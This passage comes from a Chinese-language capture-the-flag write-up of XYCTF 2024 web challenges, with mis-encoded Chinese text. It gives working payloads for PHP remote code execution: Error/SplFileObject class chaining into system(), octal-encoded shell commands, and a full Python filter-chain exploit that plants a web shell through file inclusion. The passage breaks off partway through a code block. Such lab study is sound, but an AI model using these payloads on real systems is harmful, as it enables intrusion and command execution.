<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?val1[]=1&amp;val2[]=2&amp;md5=0e215962017&amp;XY=0e215962017&amp;XYCTF=0e215962017
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/xyctf2024/image-20250729141514677.png"
	width="1261"
	height="622"
	srcset="/p/xyctf2024/image-20250729141514677_hu14710678652977205033.png 480w, /p/xyctf2024/image-20250729141514677_hu4423598222716594661.png 1024w"
	loading="lazy"
	
		alt="image-20250729141514677"
	
	
		class="gallery-image" 
		data-flex-grow="202"
		data-flex-basis="486px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/[0-9]/&#39;</span><span class="p">,</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">intval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="s2">&#34;æ“ä½œä½ O.o&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">],</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;b&#39;</span><span class="p">],</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">]);</span>  <span class="c1">// æˆ‘å¯ä¸ä¼šåƒåˆ«äººä¸€æ ·è®¾ç½®10æ¥ä¸ªlevel
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s2">&#34;æœ‰ç‚¹æ±—æµæµƒèƒŒ&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç¬¬ä¸€å±‚ç”¨æ•°ç»„ç»•è¿‡</p>
<p>ç¬¬äºŒå±‚è§£é‡Šä¸€ä¸‹<code>preg_replace</code> å‡½æ•°</p>
<p>å®ƒæœ‰ä¸€ä¸ªéå¸¸å±é™©çš„ä¿®é¥°ç¬¦ï¼š<code>/e</code>ã€‚å½“ä½¿ç”¨è¿™ä¸ªä¿®é¥°ç¬¦æ—¶ï¼Œå®ƒä¼šå°†æ›¿æ¢å­—ç¬¦ä¸²ï¼ˆç¬¬äºŒä¸ªå‚æ•°ï¼‰å½“ä½œPHPä»£ç æ¥æ‰§è¡Œã€‚</p>
<p>ç¬¬ä¸€ä¸ªå‚æ•°<code>/.*/e</code>å¯ä»¥åŒ¹é…ä»»æ„å­—ç¬¦ä¸²</p>
<p>ç¬¬äºŒä¸ªå‚æ•°æ˜¯å‘½ä»¤</p>
<p>ç¬¬ä¸‰ä¸ªå‚æ•°éšä¾¿å¡«ï¼Œå› ä¸ºä¸Šé¢çš„æ¨¡å¼æ˜¯/.*/ï¼Œå¯ä»¥åŒ¹é…ä»»æ„å­—ç¬¦ä¸²</p>
<p><img src="/p/xyctf2024/image-20250729142935979.png"
	width="1127"
	height="774"
	srcset="/p/xyctf2024/image-20250729142935979_hu10567674982201476618.png 480w, /p/xyctf2024/image-20250729142935979_hu17799874520464777693.png 1024w"
	loading="lazy"
	
		alt="image-20250729142935979"
	
	
		class="gallery-image" 
		data-flex-grow="145"
		data-flex-basis="349px"
	
></p>
<h2 id="ezclass">ezClass
</h2><h3 id="çŸ¥è¯†ç‚¹phpåŸç”Ÿç±»errorgemessagesplåŸç”Ÿç±»ä¼ªåè®®åˆ©ç”¨">çŸ¥è¯†ç‚¹ï¼šphpåŸç”Ÿç±»Errorï¼šgeMessage()ã€SplåŸç”Ÿç±»+ä¼ªåè®®åˆ©ç”¨
</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="nv">$aa</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;aa&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="nv">$b</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;b&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="nv">$bb</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;bb&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="nv">$c</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="p">((</span><span class="k">new</span> <span class="nv">$a</span><span class="p">(</span><span class="nv">$aa</span><span class="p">))</span><span class="o">-&gt;</span><span class="nv">$c</span><span class="p">())((</span><span class="k">new</span> <span class="nv">$b</span><span class="p">(</span><span class="nv">$bb</span><span class="p">))</span><span class="o">-&gt;</span><span class="nv">$c</span><span class="p">());</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ä¸»è¦æ˜¯è€ƒäº†ä¸€ä¸ªErroråŸç”Ÿç±»çš„getMessageå¯ä»¥æ„é€ ä»»æ„å­—ç¬¦ä¸²</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?a=Error&amp;aa=system&amp;b=Error&amp;bb=cat /f*&amp;c=getMessage
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">//((new Error(&#34;system&#34;)) -&gt; getMessage())((new Error(&#34;ls&#34;)) -&gt; getMessage())
</span></span></code></pre></td></tr></table>
</div>
</div><p>é€šè¿‡<code>Error</code>çš„<code>getMessage</code>è¿”å›<code>system</code>å’Œ<code>ls</code>ï¼Œç»„åˆæˆ<code>(&quot;system&quot;)(&quot;ls&quot;)</code></p>
<p>åœ¨PHPä¸­ï¼Œ<code>(&quot;system&quot;)(&quot;ls&quot;)</code> æ˜¯ä¸€ä¸ªå®Œå…¨åˆæ³•çš„è¡¨è¾¾å¼ï¼Œå®ƒç­‰åŒäºï¼š<code>system(&quot;ls&quot;);</code></p>
<p><img src="/p/xyctf2024/image-20250729152837537.png"
	width="1135"
	height="570"
	srcset="/p/xyctf2024/image-20250729152837537_hu16872782013570259015.png 480w, /p/xyctf2024/image-20250729152837537_hu6754550771762911881.png 1024w"
	loading="lazy"
	
		alt="image-20250729152837537"
	
	
		class="gallery-image" 
		data-flex-grow="199"
		data-flex-basis="477px"
	
></p>
<p>å¦ä¸€ç§è§£æ³•</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?a=SplFileObject&amp;aa=data://text/plain,system&amp;c=__toString&amp;b=SplFileObject&amp;bb=data://text/plain,ls
</span></span></code></pre></td></tr></table>
</div>
</div><p>é€šè¿‡tostringè¿”å›systemå’Œlsï¼Œå’Œä¸Šé¢å·®ä¸å¤šã€‚</p>
<h2 id="ezrce">ezRce
</h2><h3 id="çŸ¥è¯†ç‚¹æ— å­—æ¯rceå…«è¿›åˆ¶0">çŸ¥è¯†ç‚¹ï¼šæ— å­—æ¯rceï¼ˆå…«è¿›åˆ¶+$0&laquo;&lt;ï¼‰
</h3><p>æ— å­—æ¯rceï¼Œåªæœ‰æ•°å­—å’Œå‡ ä¸ªç¬¦å·ï¼Œå¯ä»¥é€šè¿‡å…«è¿›åˆ¶æ„é€ å‘½ä»¤</p>
<p><img src="/p/xyctf2024/image-20250729162833971.png"
	width="1207"
	height="701"
	srcset="/p/xyctf2024/image-20250729162833971_hu4836226417956947426.png 480w, /p/xyctf2024/image-20250729162833971_hu11988099955416006299.png 1024w"
	loading="lazy"
	
		alt="image-20250729162833971"
	
	
		class="gallery-image" 
		data-flex-grow="172"
		data-flex-basis="413px"
	
></p>
<p><code>$0</code>å¯ä»¥ä»£è¡¨å½“å‰æ‰§è¡Œçš„è„šæœ¬æˆ–Shellæœ¬èº«çš„åå­—</p>
<p><code>&lt;&lt;&lt;</code>:èƒ½å°†ç´§è·Ÿåœ¨åé¢çš„å­—ç¬¦ä¸²ä½œä¸ºæ ‡å‡†è¾“å…¥ï¼ˆstdinï¼‰ä¼ é€’ç»™å‰é¢çš„å‘½ä»¤</p>
<p><code>$0 &lt;&lt;&lt; '...'</code> çš„æ„æ€å°±æ˜¯ï¼š<strong>å¯åŠ¨ä¸€ä¸ªæ–°çš„Bash Shellï¼Œç„¶åæŠŠ <code>'...'</code> é‡Œçš„å­—ç¬¦ä¸²å†…å®¹å–‚ç»™è¿™ä¸ªæ–°çš„Shellå»æ‰§è¡Œã€‚</strong></p>
<p>æŠŠå…«è¿›åˆ¶å‘½ä»¤æ”¾è¿›å»å°±è¡Œ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?cmd=$0&lt;&lt;&lt;$%27\143\141\164\040\057\146\154\141\147%27
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">é‚£å…¶å®ç›´æ¥å…«è¿›åˆ¶cat&lt;/flagä¹Ÿè¡Œ
</span></span><span class="line"><span class="cl">?cmd=$&#39;\143\141\164&#39;&lt;$&#39;\57\146\154\141\147&#39;
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/xyctf2024/image-20250729162550165.png"
	width="1186"
	height="606"
	srcset="/p/xyctf2024/image-20250729162550165_hu7923446866726682695.png 480w, /p/xyctf2024/image-20250729162550165_hu1230923489866304935.png 1024w"
	loading="lazy"
	
		alt="image-20250729162550165"
	
	
		class="gallery-image" 
		data-flex-grow="195"
		data-flex-basis="469px"
	
></p>
<h2 id="ezlfi">ezLFI
</h2><h3 id="çŸ¥è¯†ç‚¹åˆ©ç”¨filterè¿‡æ»¤å™¨çš„ç¼–ç ç»„åˆæ„é€ rce">çŸ¥è¯†ç‚¹ï¼šåˆ©ç”¨filterè¿‡æ»¤å™¨çš„ç¼–ç ç»„åˆæ„é€ RCE
</h3><p>è¿›é¡µé¢ä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œæç¤ºLFIï¼Œå°±æ˜¯æ–‡ä»¶åŒ…å«ï¼Œè¯•è¯•fileå‚æ•°</p>
<p><img src="/p/xyctf2024/image-20250730193626370.png"
	width="1303"
	height="607"
	srcset="/p/xyctf2024/image-20250730193626370_hu17598898673209395244.png 480w, /p/xyctf2024/image-20250730193626370_hu3092467248937010636.png 1024w"
	loading="lazy"
	
		alt="image-20250730193626370"
	
	
		class="gallery-image" 
		data-flex-grow="214"
		data-flex-basis="515px"
	
></p>
<p>okå¼€åŒ…</p>
<p>åŒ…å•¥å‘€ï¼Œå•¥éƒ½æ²¡æœ‰ï¼Œä¸çŸ¥åˆ°è¿‡æ»¤äº†å•¥ã€‚ç›´æ¥ç¿»wpäº†</p>
<p>è´´ä¸€ä¸ªexpï¼Œç„¶åè§£é‡Šä¸€ä¸‹exp</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://localhost/index.php&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">file_to_use</span> <span class="o">=</span> <span class="s2">&#34;/etc/passwd&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">command</span> <span class="o">=</span> <span class="s2">&#34;/readflag&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#&lt;?=`$_GET[0]`;;?&gt;</span>
</span></span><span class="line"><span class="cl"><span class="n">base64_payload</span> <span class="o">=</span> <span class="s2">&#34;PD89YCRfR0VUWzBdYDs7Pz4&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">conversions</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;R&#39;</span><span class="p">:</span> <span class="s1">&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;B&#39;</span><span class="p">:</span> <span class="s1">&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;C&#39;</span><span class="p">:</span> <span class="s1">&#39;convert.iconv.UTF8.CSISO2022KR&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;8&#39;</span><span class="p">:</span> <span class="s1">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;9&#39;</span><span class="p">:</span> <span class="s1">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;f&#39;</span><span class="p">:</span> <span class="s1">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;s&#39;</span><span class="p">:</span> <span class="s1">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;z&#39;</span><span class="p">:</span> <span class="s1">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;U&#39;</span><span class="p">:</span> <span class="s1">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;P&#39;</span><span class="p">:</span> <span class="s1">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;V&#39;</span><span class="p">:</span> <span class="s1">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;0&#39;</span><span class="p">:</span> <span class="s1">&#39;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;Y&#39;</span><span class="p">:</span> <span class="s1">&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;W&#39;</span><span class="p">:</span> <span class="s1">&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;d&#39;</span><span class="p">:</span> <span class="s1">&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;D&#39;</span><span class="p">:</span> <span class="s1">&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;7&#39;</span><span class="p">:</span> <span class="s1">&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;4&#39;</span><span class="p">:</span> <span class="s1">&#39;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#39;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># generate some garbage base64</span>
</span></span><span class="line"><span class="cl"><span class="n">filters</span> <span class="o">=</span> <span class="s2">&#34;convert.iconv.UTF8.CSISO2022KR|&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">filters</span> <span class="o">+=</span> <span class="s2">&#34;convert.base64-encode|&#34;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span>
</span></span><span class="line"><span class="cl"><span class="n">filters</span> <span class="o">+=</span> <span class="s2">&#34;convert.iconv.UTF8.UTF7|&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">base64_payload</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">        <span class="n">filters</span> <span class="o">+=</span> <span class="n">conversions</span><span class="p">[</span><span class="n">c</span><span class="p">]</span> <span class="o">+</span> <span class="s2">&#34;|&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># decode and reencode to get rid of everything that isn&#39;t valid base64</span>
</span></span><span class="line"><span class="cl">        <span class="n">filters</span> <span class="o">+=</span> <span class="s2">&#34;convert.base64-decode|&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="n">filters</span> <span class="o">+=</span> <span class="s2">&#34;convert.base64-encode|&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># get rid of equal signs</span>
</span></span><span class="line"><span class="cl">        <span class="n">filters</span> <span class="o">+=</span> <span class="s2">&#34;convert.iconv.UTF8.UTF7|&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">filters</span> <span class="o">+=</span> <span class="s2">&#34;convert.base64-decode&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">final_payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;php://filter/</span><span class="si">{</span><span class="n">filters</span><span class="si">}</span><span class="s2">/resource=</span><span class="si">{</span><span class="n">file_to_use</span><span class="si">}</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;0&#34;</span><span class="p">:</span> <span class="n">command</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;action&#34;</span><span class="p">:</span> <span class="s2">&#34;include&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;file&#34;</span><span class="p">:</span> <span class="n">final_payload</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>é¦–å…ˆæ˜¯åé—¨æ–‡ä»¶<code>&lt;?=$_GET[0];;?&gt;</code>base64åå¾—åˆ°çš„æ˜¯<code>PD89YCRfR0VUWzBdYDs7Pz4=</code></p>
<p>åœ¨PHP Fliterä¸­å­˜åœ¨ä¸€ç§<code>convert.iconv</code>çš„è¿‡æ»¤å™¨ï¼Œä»–å¯ä»¥ç”¨äºè½¬åŒ–å­—ç¬¦é›†ï¼Œç„¶åæˆ‘ä»¬å‘ç°</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">convert.iconv.UTF8.CSISO2022KRå°†å§‹ç»ˆåœ¨å­—ç¬¦ä¸²å‰é¢é™„åŠ &#34;\x1b$)C&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">convert.base64-decodeåŸºæœ¬ä¸Šä¼šå¿½ç•¥ä»»ä½•éæœ‰æ•ˆ base64 çš„å­—ç¬¦ã€‚
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ·»åŠ å­—ç¬¦ä¸²å‰ç½®<code>\x1b$)C</code>åï¼Œåº”ç”¨ä¸€äº› iconv è½¬æ¢é“¾ï¼Œä½¿æˆ‘ä»¬çš„åˆå§‹ base64 ä¿æŒä¸å˜ å¹¶å°†æˆ‘ä»¬åˆšåˆšæ·»åŠ çš„éƒ¨åˆ†è½¬æ¢ä¸ºæŸäº›å­—ç¬¦ä¸²ï¼Œå…¶ä¸­å”¯ä¸€æœ‰æ•ˆçš„ base64 char æ˜¯æˆ‘ä»¬ base64 ç¼–ç çš„ PHP ä»£ç çš„ä¸€éƒ¨åˆ†</p>
<p>å†é€šè¿‡base64-decode å’Œ base64-encode åˆ é™¤ä¸­é—´çš„åƒåœ¾å­—ç¬¦,ä»è€Œæ„é€ å‡ºä»£ç </p>
<p>è€å¤–å†™çš„ï¼Œæœ‰ä¸€äº›ä¸æ˜ä¸ç™½çš„åœ°æ–¹ï¼Œçœ‹äº†å¾ˆå¤šæ–‡ç« éƒ½æ²¡æœ‰è§£æƒ‘ï¼Œè¿™é‡Œå…ˆæ”¾æ”¾ã€‚</p>
<h2 id="ezpop">ezPop
</h2><h3 id="çŸ¥è¯†ç‚¹gcåƒåœ¾å›æ”¶call_user_funcabcd">çŸ¥è¯†ç‚¹ï¼šGCåƒåœ¾å›æ”¶ã€call_user_func($a,$b)($c)($d)
</h3><p><img src="/p/xyctf2024/image-20250802211802489.png"
	width="687"
	height="1145"
	srcset="/p/xyctf2024/image-20250802211802489_hu9567018524117140688.png 480w, /p/xyctf2024/image-20250802211802489_hu6153031978453900890.png 1024w"
	loading="lazy"
	
		alt="image-20250802211802489"
	
	
		class="gallery-image" 
		data-flex-grow="60"
		data-flex-basis="144px"
	
></p>
<p>é“¾å­å¾ˆç®€å•ï¼Œå°±ä¸å¤šè¯´äº†ï¼Œä¸»è¦æ˜¯å¯¹<code>call_user_func($a,$b)($c)($d)</code>çš„ç†è§£</p>
<p>è¿™è¡Œä»£ç ç®€å•æ¥è¯´å°±æ˜¯</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$f1</span> <span class="o">=</span> <span class="nx">call_user_func</span><span class="p">(</span><span class="nv">$a</span><span class="p">,</span> <span class="nv">$b</span><span class="p">);</span> <span class="c1">// $f1 å¿…é¡»æ˜¯ callable
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$f2</span> <span class="o">=</span> <span class="nv">$f1</span><span class="p">(</span><span class="nv">$c</span><span class="p">);</span>                <span class="c1">// $f2 å¿…é¡»æ˜¯ callable
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$result</span> <span class="o">=</span> <span class="nv">$f2</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span>            <span class="c1">// $result å°±æ˜¯æœ€ç»ˆç»“æœ
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>æ‰€ä»¥æˆ‘ä»¬éœ€è¦æ‰¾åˆ°ç¬¦åˆè¿™ç§æƒ…å†µå¹¶ä¸”å¯ä»¥rceçš„å‡½æ•°</p>
<p>åœ¨å¯»æ‰¾ä¹‹å‰ï¼Œæˆ‘ä»¬è¦å…ˆäº†è§£ä¸€ä¸‹<code>__get()</code>å‡½æ•°çš„é€»è¾‘</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
